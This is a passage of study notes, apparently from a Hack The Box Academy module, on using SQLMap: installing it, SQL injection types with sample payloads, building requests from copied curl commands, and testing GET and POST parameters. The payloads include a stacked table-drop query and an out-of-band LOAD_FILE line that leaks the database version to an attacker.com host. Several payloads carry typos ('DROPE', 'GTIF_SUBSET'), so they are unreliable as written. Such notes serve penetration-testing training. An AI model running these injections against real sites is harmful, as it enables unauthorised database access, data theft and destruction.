
To use SQLMap we can use : `python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'`
To install SQLMap : 
``` shell
# For Linux
sudo apt install sqlmap

#For Windows
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

## Types of SQLi
- **Boolean-based Blind SQL Injection** : `AND 1=1`
- **Error-based SQL Injection** : `AND GTIF_SUBSET(@@version,0)`
- **Union query based** : `UNION ALL SELECT 1,@@version,3`
- **Stacked Queries** : `; DROPE TABLE users`
- **Time-based Blind SQL Injection** : `AND 1=IF(2>1,SLEEP(5),0)`
- **Inline Queries** : `SELECT(SELECT @@version) from`
- **Out-of-band SQL Injection** : `LOAD_FILE(CONCAT('\\\',@@version,'.attacker.com\\README.txxt'))`

## Levels of Help Message Listing
- Basic Listing : `sqlmap -h`
- Advanced Listing: `sqlmap --hh`

Command used to run SQLMap : `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`

> Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.

## cURL Commands
One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools: ![Network panel showing a GET request to www.example.com with a 404 status, and a context menu with options like 'Copy as cURL'.](https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

Running SQLMap on an HTTP Request

```shell-session
ShibuShivansh@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).

## GET/POST Requests
For GET Request, we need to run the command : `sqlmap --url "https://domain.com"`

For POST Request, we need to run the command : `sqlmap 'http://www.example.com/' --data 'uid=1&name=test`
> Now here both the parameters `uid` and `name` will be tested, but if we need one of them to be tested then the 
